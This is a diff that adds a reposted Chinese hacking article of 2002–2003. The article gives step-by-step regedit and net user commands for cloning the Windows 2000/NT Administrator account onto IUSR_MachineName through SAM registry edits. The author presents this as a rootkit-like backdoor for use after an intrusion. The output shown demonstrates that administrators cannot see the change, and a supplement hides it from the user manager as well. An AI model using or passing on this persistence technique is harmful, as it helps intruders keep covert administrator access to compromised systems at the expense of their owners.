@@ -1,0 +1,96 @@
+克隆管理员帐号的方法
+
+创建时间：2003-09-14
+文章属性：转载
+文章提交：bingle (bingle_at_email.com.cn)
+
+Author:Adam@nsfocus.com  & 叮叮
+Date:2002-04-28 
+Site:http://www.sometips.com 
+
+经常看到一些人在入侵一台Windows 2000或者Windows NT后堂而皇之地创建一个管理员组的用户，似乎当管理员不存在一般，今天偶违背一下偶以前的初衷，Share一个类似于RootKit的玩艺，当然，这些过程也是可以用脚本实现的，但是我就不写了，OK，Show Time Now。 
+
+首先要让大家知道的概念是在Windows 2000和Windows NT里，默认管理员帐号的SID是固定的500（0x1f4），那么我们可以用机器里已经存在的一个帐号将SID为500的帐号进行克隆，在这里我们选择的帐号是IUSR_MachineName（当然，为了加强隐蔽性，我们选择了这个帐号，所有用户都可以用以下的方法，只不过这个用户较常见罢了），测试环境为Windows 2000 Server。 
+
+运行一个System的CMD Shell( http://www.sometips.com/tips/scripts/173.htm 或使用 Http://www.sometips.com/soft/psu.exe)，然后在该CMD Shell里面运行 
+regedit /e adam.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 
+这样我们将SID 为500的管理员帐号的相关信息导出，然后编辑adam.reg文件，将adam.reg文件的第三行--[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4]最后的'1F4'修改为IUSR_MachineName的SID（大部分的机器该用户的SID都为0x3E9，如果机器在最初安装的时候没有安装IIS，而自己创建了帐号后再安装IIS就有可能不是这个值），将Root.reg文件中的'1F4'修改为'3E9'后执行 
+regedit /s adam.reg 
+导入该Reg文件 
+
+然后运行 
+net user IUSR_MachineName Sometips 
+修改IUSR_MachineName的密码（最好使用14位的密码，越像IUSR_MachineName的密码越好） 
+
+OK,大功告成... 
+
+这样，我们拥有和默认管理员一样的桌面、一样的Profile..... 
+而且，当我们运行 net localgroup administrators 时，看看结果： 
+C:\>net localgroup administrators 
+Alias name administrators 
+Comment Administrators have complete and unrestricted access to the computer/domain 
+
+Members 
+
+------------------------------------------------------------------------------- 
+Administrator 
+The command completed successfully. 
+
+再看看USER2SID的输出结果： 
+C:\>user2sid Administrator 
+
+S-1-5-21-1004336348-1078145449-854245398-500 
+
+Number of subauthorities is 5 
+Domain is IDONTKNOW 
+Length of SID in memory is 28 bytes 
+Type of SID is SidTypeUser 
+
+C:\>user2sid iusr_machinename 
+
+S-1-5-21-1004336348-1078145449-854245398-1001 
+
+Number of subauthorities is 5 
+Domain is IDONTKNOW 
+Length of SID in memory is 28 bytes 
+Type of SID is SidTypeUser 
+
+我想，再高明的管理员也看不到任何的异状了...而且，随便管理员改成什么密码，我照样可以用IUSR_MachineName，密码为Sometips登陆...(没有哪位大侠级的管理员喜欢经常修改IUSR_MachineName为其他的名字吧) 
+
+^_^，这算不算RootKit... 
+
+附： 
+1、感谢叮叮付出需要reinstall OS的代价... 
+2、任何用以上方法进行试验所导致的系统无法使用均与偶无关，偶均不提供技术支持... 
+
+-----------------------------------------------------------------------------
+
+叮叮 的补充完善 
+
+很多人提到使用了管理工具的用户管理后，能够发现IUSR_MachineName被提升了权限。 
+现给出解决办法。 
+
+方法同上，不过这次修改内容多一些。即 
+这次要导出两个key内容： 
+一个是adam提到的 
+regedit /e adam.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 
+然后另外一个是你需要修改那个账号的值 
+regedit /e iusr.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9 
+
+然后按照adam提到的修改adam.reg 
+“将adam.reg文件的第三行--[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4]最后的'1F4'修改为IUSR_MachineName的SID” 
+
+现在，你还要从iusr.reg文件中复制一下内容 
+就是将iusr.reg文件中“'V'=hex:0”开始一直到iusr.reg文件结束部分复制下来 
+然后替换掉adam.reg中同样位置的部分 
+
+最后使用 
+regedit /s adam.reg 
+导入该Reg文件 
+呵呵，别忘了给这个IUSR_MachineName改密码哦。 
+hehe,ok，大功告成。 
+现在IUSR_MachineName账号拥有了管理员的权限，但是你使用net.exe和 
+管理工具中的用户管理都将看不到任何痕迹，即使你去察看所属于的组和用户。 
+都和修改前没有任何区别。 
+
+好了，补充结束。 
